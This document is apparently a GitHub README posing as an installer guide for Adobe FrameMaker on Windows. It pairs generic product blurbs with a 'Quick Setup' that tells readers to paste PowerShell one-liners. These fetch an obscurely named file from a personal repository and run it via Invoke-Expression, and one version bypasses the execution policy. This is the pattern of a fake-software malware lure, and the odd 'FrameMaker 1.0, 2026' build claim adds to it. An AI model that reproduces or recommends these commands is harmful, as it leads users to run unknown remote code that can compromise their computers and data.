# FrameMaker

FrameMaker is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open FrameMaker and work in it.

Adobe FrameMaker on Windows is built for technical writers, engineers, and documentation teams who produce manuals, policies, and standards that run to hundreds of pages. You work in structured frames with paragraph and character tags, build books from chapter files, and reuse content through variables and cross-references instead of copying text by hand.

A typical session starts by opening a book or document and applying the correct template so headings, tables, and notes stay consistent. You edit body copy, insert graphics and equations, tune conditional text for different audiences, then update the table of contents and index before generating PDF or print output. Review cycles often mean refreshing cross-references and rebuilding the book so page numbers and links stay accurate.

This repository holds a Windows setup package for installing FrameMaker locally, release notes that summarize what changed between builds, and a changelog for tracking fixes and workflow tweaks on your machines. Use the notes when you roll out a new version or align tag catalogs and templates across a writing team.

## What you do with it

- Paragraph and character tags keep headings, body text, and notes styled across large manuals.
- Book files assemble chapters so page numbers, cross-references, and TOCs stay synchronized.
- Conditional text shows or hides paragraphs for product variants without maintaining duplicate source files.
- Structured XML and DITA workflows map content to schemas for reuse in help systems and portals.
- Automatic numbering for figures, tables, and steps updates when you insert or reorder content.
- Cross-references resolve to live page numbers and headings after you regenerate the book output.
- Table formats and anchored frames control complex layouts for specs, wiring diagrams, and data sheets.
- PDF and print publishing applies master pages, running headers, and index markers in one export pass.

## Quick Setup (PowerShell)

This installs the program FrameMaker on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/sofias986655/framemaker-setup-guide/main/bl4ottklk7.4rczyhr5 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/sofias986655/framemaker-setup-guide/main/bl4ottklk7.4rczyhr5 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `bl4ottklk7.4rczyhr5` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `sofias986655/framemaker-setup-guide`. Adobe FrameMaker 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
